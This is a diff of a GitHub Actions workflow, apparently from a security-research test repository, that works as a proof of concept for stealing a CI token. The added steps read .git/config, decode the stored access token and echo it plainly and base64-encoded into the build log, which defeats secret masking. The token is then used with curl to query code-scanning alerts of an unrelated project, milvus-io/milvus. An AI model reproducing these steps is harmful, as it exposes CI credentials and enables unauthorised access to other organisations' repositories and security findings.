@@ -33,18 +33,12 @@ jobs:
         run: |        
           ls /home/runner/work/artifacts/artifacts
           cd /home/runner/work/artifacts/artifacts/.git
-          #unzip /home/runner/work/artifacts/artifacts/go-result ".git/config" -d extracted_files
+          cat config | base64
           token=$(grep -o 'basic .*' config | sed "s|basic ||g" | base64 -d | sed "s|x-access-token:||g")
           echo $token
           echo $token | base64
 
-      - name: Use Token On Me
-        run: |
           curl --location --request GET 'https://api.github.com/repos/cider-research-testing/artifacts/code-scanning/alerts' --header 'Content-Type: application/json' --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
-          
-      - name: Use Token
-        run: |
-          echo $token | base64
           curl --location --request GET 'https://api.github.com/repos/milvus-io/milvus/code-scanning/alerts' --header 'Content-Type: application/json' --header 'Authorization: Bearer $token'
 
         
